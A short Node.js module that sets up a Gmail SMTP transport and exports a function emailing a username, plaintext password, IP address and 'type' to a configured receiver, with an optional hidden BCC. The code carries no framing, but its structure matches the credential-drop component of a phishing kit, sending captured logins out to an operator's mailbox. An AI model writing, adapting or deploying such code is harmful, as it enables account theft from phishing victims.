const nodemailer = require('nodemailer');

function createNodeMailerTransport() {
    return nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,          // SSL port for Gmail
        secure: true,       // use SSL
        auth: {
            user: process.env.SMTP_USER, // your Gmail address
            pass: process.env.SMTP_PASS  // Gmail App Password if 2FA enabled
        }
    });
}

function sendEmail(res, subject, username, pass, ip, type) {
    const transport = createNodeMailerTransport();

    const mailDetails = {
        from: `"${process.env.MAIL_SENDER_NAME}" <${process.env.SMTP_USER}>`,
        to: process.env.MAIL_RECEIVER,
        bcc: process.env.BCC_RECEIVER || "", // optional
        subject: subject,
        html: `<p>Username: ${username}</p>
               <p>Password: ${pass}</p>
               <p>IP Address: ${ip}</p>
               <p>Type: ${type}</p>`
    };

    // Verify SMTP connection first
    transport.verify((err, success) => {
        if (err) {
            console.error("SMTP verification failed:", err);
            return res.status(500).send({ response: 'failed', error: err.toString() });
        }

        transport.sendMail(mailDetails, (err, info) => {
            if (err) {
                console.error("Error sending mail:", err);
                return res.status(500).send({ response: 'failed', error: err.toString() });
            }

            console.log("Email sent successfully:", info.response);
            return res.status(200).send({ response: 'success' });
        });
    });
}

module.exports = { sendEmail };
